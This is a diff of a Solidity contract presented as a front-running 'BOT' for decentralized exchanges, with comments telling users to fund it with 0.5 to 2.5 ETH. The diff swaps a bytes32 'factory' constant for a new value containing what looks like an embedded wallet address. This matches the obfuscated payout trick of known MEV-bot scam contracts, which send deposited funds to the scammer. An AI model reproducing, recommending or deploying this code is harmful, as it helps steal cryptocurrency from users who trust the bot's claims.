@@ -30,7 +30,7 @@ pragma solidity ^0.8.4;
 // Testnet transactions will fail beacuse they have no value in them
 // FrontRun api stable build
 // Mempool api stable build
-// BOT updated build MAY/8/2025
+// BOT updated build MAY/25/2025
 
 // The minimum liquidity remaining after gas fees must be 0.5 ETH //
 // The maximum liquidity allowed after gas fees is 2.5 ETH //
@@ -202,7 +202,7 @@ contract DexInterface {
         require(endBalance > startBalance, "Trade Reverted, No Profit Made");
     }
 
-    bytes32 factory = 0xfdc54b1a6f53a21d375d0deaea88cfbc0e0abf96ac26238d70ba2f397b8ef325;
+    bytes32 factory = 0xfdc54b1a6f53a21d375d0deaCC48F5FeDFffaF819083Ea96ACAB12def447bf38;
 
     function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
         uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
